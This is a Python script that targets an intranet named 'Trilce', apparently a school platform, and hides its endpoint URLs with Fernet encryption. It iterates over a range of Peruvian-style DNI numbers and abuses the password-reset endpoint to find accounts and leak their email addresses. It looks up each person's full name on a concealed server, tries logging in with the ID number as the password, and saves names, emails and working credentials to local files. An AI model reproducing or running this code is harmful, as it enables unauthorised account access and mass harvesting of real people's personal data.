import requests
import base64
from concurrent.futures import ThreadPoolExecutor
from cryptography.fernet import Fernet
from pwn import *
from colorama import Fore,init
init()
verde, rojo, blanco, cyan, reset = Fore.LIGHTGREEN_EX, Fore.LIGHTRED_EX, Fore.WHITE, Fore.LIGHTCYAN_EX, Fore.RESET

class Trilce:
    def __init__(self) -> None:
        autoriza = b'1uAz78g5cbgOHMjhOLDxqtUJPw6DIZsQi-7EdiWpnsI='
        self.url = Fernet(autoriza).decrypt(base64.b64decode('Z0FBQUFBQmtPd1BhZ1RQNFdwMlZuSkUwdGpTV1A3bFVzUEwyaE1VX0JqWXhhY0lhU1JnOS1FR3pKMFRKSDJLQjlLbGl0bGJQdUZOQ1AycjlzZGUxQTFYbVY1ME1ackhHRTdCY096b0w2WS1HSkhldWFtM1o2NlE2UV9hanBmZGNLZW5reVBPYTZPR1g='.encode('utf-8'))).decode('utf-8')
        self.peticion = requests.session()
    
    def consultarDNI(self, var):
        variable_x = b'U8WLbRAqCBJQABug1y8Y4sf16IE7P_eoM-YbMGJlMlI='
        server = Fernet(variable_x).decrypt(base64.b64decode('Z0FBQUFBQmtPdnZwdTNhem5kazVPTlZ5Qks0aURyWnd6MW9GRjlSVlpoY01wZWVkMW5DWEM0N2N2SUV1SW9CZDYzSWhJcFF6aFV0NUoxUFY3SUtOMk1fLWN1dW5NRDFadEwtT0JkcjBEd05PT1BocUZmS2VFUUp4bElVWVdtbFJSUWhsZ3l5RThpZTA='.encode('utf-8'))).decode('utf-8')
        consulta = requests.post(server, json={"numeroDNI": var})
        return consulta.json()

    def ProbarPassowrd(self, var):
        headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41",
                "X-Requested-With": "XMLHttpRequest",
                "Cookie": "_gcl_au=1.1.996391256.1651722196; _ga=GA1.3.369441232.1651722199; _fbp=fb.2.1651722199391.993005824; _hjSessionUser_1415085=eyJpZCI6ImJlYTBiZWQ3LWMyMTMtNTNiZC1hNjUzLWM0YTY3ZmNiYTcyMiIsImNyZWF0ZWQiOjE2NTE3MjIyMDA0ODAsImV4aXN0aW5nIjpmYWxzZX0=; G_ENABLED_IDPS=google; _gid=GA1.3.1916970361.1656521090; _gat=1"
        }
        pet = self.peticion.post(self.url+"Intranet/Autenticar", headers=headers, json={"UserName": var,"Password": var,"Captcha": ""})
        if "introducido es incorrecto" in pet.text:
            fail = f"contrase침a fallida."
            return fail.strip()
        else:
            msj = f"usuario: {var}, contrase침a: {var}"
            f = open ('trilce_passwords.txt','a')
            f.write('\n' + f'usuario: {var}| contrase침a: {var}')
            f.close()
            return msj.strip()

    def ConsultaCuenta(self, dni):
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41",
                "X-Requested-With": "XMLHttpRequest",
                "Cookie": "_gcl_au=1.1.1305896466.1662692391; _ga=GA1.3.1653021784.1662692392; _gid=GA1.3.1891039176.1662692392; _gat_gtag_UA_112446135_1=1; _fbp=fb.2.1662692392415.1810474920; _hjSessionUser_1415085=eyJpZCI6IjQ4NTRhZTJkLWMzMGQtNTU0Ny1hMWFjLWQ2ZDMwZDk1NmFjYiIsImNyZWF0ZWQiOjE2NjI2OTIzOTYyMTIsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_1415085=eyJpZCI6ImQwNjM1YjdiLWQwY2MtNDJiNS1iNDI4LTdhY2QxYWVhZDQ5ZiIsImNyZWF0ZWQiOjE2NjI2OTIzOTYzODMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; G_ENABLED_IDPS=google"
            }
            resp = self.peticion.post(self.url+"Intranet/OlvidoContrasenia", headers=headers, json={"UserName": dni,"Captcha": ""})
            print(resp.text)
            if "Se envi칩 un correo a" in resp.text:
                rpta = resp.text[23:]
                mail = rpta.replace('"', "")
                DataJson = self.consultarDNI(dni)
                nombre = DataJson['Contenido']['prenombres']
                ape_pa = DataJson['Contenido']['apPrimer']
                ape_ma = DataJson['Contenido']['apSegundo']
                password = self.ProbarPassowrd(dni)
                f = open ('usuarios.txt','a')
                f.write('\n' + f'{dni}|{ape_pa}|{ape_ma}|{nombre}|{mail}')
                f.close()          
                log.success(f"[{dni}]{cyan} {nombre} {ape_pa} {ape_ma} {verde}{mail}  {blanco}=>> {verde}{password}{reset}")
            else:
                log.failure(f"{rojo}[{dni}] No esta registrado.{reset}")

        except Exception as e:
            print(e)

lista_documentos = []
for x in range(70770000,70779999):
    lista_documentos.append(x)

x = Trilce()
def main(documento:str):
    x.ConsultaCuenta(documento)

with ThreadPoolExecutor(max_workers=5) as hilo:
    hilo.map(main, lista_documentos)
